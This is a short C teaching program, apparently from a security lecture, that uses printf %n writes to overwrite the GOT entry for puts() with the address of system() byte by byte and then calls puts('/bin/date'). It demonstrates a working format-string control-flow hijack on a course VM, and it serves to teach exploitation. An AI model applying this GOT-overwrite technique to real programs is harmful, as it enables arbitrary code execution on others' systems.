/*
*   Code to perform Overwriting GOT entry with printf exploit from lecture 7
*   NOTE: this program must be executed on the VM for the exploit to work
*/
#include <stdio.h>
#include <string.h>

int main()
{
    //address of GOT entry for puts()
    void *ptr2puts = 0x804a010; //NOTE: this address may be different on the actual system
    //address of system()
    void *systemaddr = 0xb7e52da0; // = 3085249952

    //Divide the large value of systemaddr into multiple pieces
    //then the following 4 printf %n place 0xb7e52da0 into the GOT entry for puts 1 byte at a time

    printf("%160u%n\n", 0, (int *)ptr2puts);        //0x000000a0 = 160
    // 0x804a010: a0000000
    //            ^
    //            ptr2puts

    printf("%45u%n\n", 0, (char *) ptr2puts+1);     //0x0000002d = 45
    // 0x804a010: a02d0000 00
    //              ^
    //            ptr2puts+1

    printf("%229u%n\n", 0, (char *) ptr2puts+2);    //0x000000e5 = 229
    // 0x804a010: a02de500 0000
    //                ^
    //            ptr2puts+2

    printf("%183u%n\n", 0, (char *) ptr2puts+3);    //0x000000b7 = 183
    // 0x804a010: a02de5b7 000000
    //                  ^
    //            ptr2puts+3

    //puts() has been replaced by system, like calling system("date")
    puts("/bin/date");
}